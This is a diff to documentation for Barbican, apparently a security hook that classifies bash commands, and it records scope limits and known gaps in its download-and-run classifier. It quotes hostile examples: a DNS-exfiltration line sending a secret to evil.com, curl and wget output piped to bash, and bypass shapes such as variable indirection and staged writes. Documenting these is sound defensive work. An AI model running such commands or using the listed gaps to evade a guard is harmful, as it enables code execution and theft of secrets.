@@ -52,6 +52,7 @@ Every input the parser rejects collapses to `ParseError::Malformed` and the hook
 
 These inputs parse cleanly but are outside the scope of the phase that shipped the current classifier. Later phases close them; tests pin the current behavior.
 
+- **H1 network-tool scope is `curl`/`wget` only.** Per Narthex parity, the H1 pipeline classifier denies only `curl`/`wget` piped to a shell interpreter. Other egress channels in `NETWORK_TOOLS_HARD` (`nc`, `ncat`, `socat`, `ssh`, `dig`, `host`, `nslookup`, `drill`, `resolvectl`) are not H1's job — they are the M2 classifier's responsibility (Phase 5), where DNS-exfil composition (`cat secret | dig {}.evil.com`) is detected. Pinned by `nc_pipe_bash_allows_h1_is_curl_wget_only` and siblings.
 - **Variable indirection on `argv[0]`** — e.g. `CURL=/usr/bin/curl; $CURL https://x | bash`. The parser surfaces `$CURL` as the basename, not `curl`, so the H1 classifier doesn't match. Requires variable tracking which Phase 2 does not ship. Pinned by `variable_indirection_allows_phase2_does_not_resolve_vars`.
 - **Case-sensitive shell names** — `BASH` ≠ `bash` on Unix. Pinned by `uppercase_shell_name_allows_bash_is_case_sensitive`.
 - **Staged writes without a pipeline** — `wget -O /tmp/s.sh; bash /tmp/s.sh`. Phase 2 H1 only classifies within-pipeline shapes; the cross-command staging pattern is Phase 3 H2. Pinned by `two_pipelines_curl_then_bash_allows_h1_is_per_pipeline`.
@@ -72,7 +73,6 @@ All knobs are environment variables read at process start; none are persistent o
 | `BARBICAN_SAFE_READ_ALLOW_SENSITIVE` | `0` | If `1`, `safe_read` permits reads under `~/.ssh/`, `~/.aws/`, etc. (L3) |
 | `BARBICAN_SAFE_READ_EXTRA_DENY` | _(empty)_ | Colon-separated path prefixes to add to the sensitive list. |
 | `BARBICAN_SAFE_READ_ALLOW` | _(empty)_ | Colon-separated path prefixes to carve out of the sensitive list. |
-| `BARBICAN_ALLOW_UNPARSEABLE` | `0` | If `1`, allow inputs the bash parser can't classify (with audit-log surfacing). |
 
 The rule for new knobs: **strict default, named opt-out, documented here**. Never silently weaken a check; if a real false positive surfaces, add a knob.
 
